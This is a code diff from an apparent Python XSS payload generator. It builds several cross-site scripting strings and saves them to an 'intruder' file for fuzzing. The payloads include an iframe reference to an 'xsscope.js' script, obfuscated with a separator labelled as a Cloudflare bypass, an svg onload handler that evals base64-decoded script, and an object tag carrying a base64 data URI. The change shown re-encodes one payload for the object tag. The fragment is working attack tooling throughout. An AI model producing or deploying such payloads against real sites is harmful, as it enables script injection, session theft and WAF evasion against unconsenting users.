@@ -664,7 +664,11 @@ def show_payload():
                    19] + cloudflare_bypass + "/" + cloudflare_bypass + "x" + cloudflare_bypass + "s" + cloudflare_bypass + "s" + cloudflare_bypass + "c" + cloudflare_bypass + "o" + cloudflare_bypass + "p" + cloudflare_bypass + "e" + cloudflare_bypass + "." + cloudflare_bypass + "j" + cloudflare_bypass + "s" + cloudflare_bypass + "></iframe>"
     payload9 = '">' + str(payload1)
     payload10_final = "<svg/onload=eval(atob('" + payload10 + "))>"
-    payload11 = '<object data="data:text/html;base64,' + payload10 + '"></object>'
+
+    payload1_b64 = str(base64.b64encode(payload1.encode('utf-8')))
+    payload1_b64 = str(payload1_b64.split("b'")[1])
+    payload1_b64 = str(payload1_b64[:-1])
+    payload11 = '<object data="data:text/html;base64,' + payload1_b64 + '"></object>'
 
     # save to intruder file
     intruder_content = payload1 + "\n" + payload2 + "\n" + payload3_final + "\n" + payload4 + "\n" + payload5 + "\n" + payload6 + "\n" + payload7 + "\n" + payload8 + "\n" + payload9 + "\n" + payload10_final + "\n" + payload11
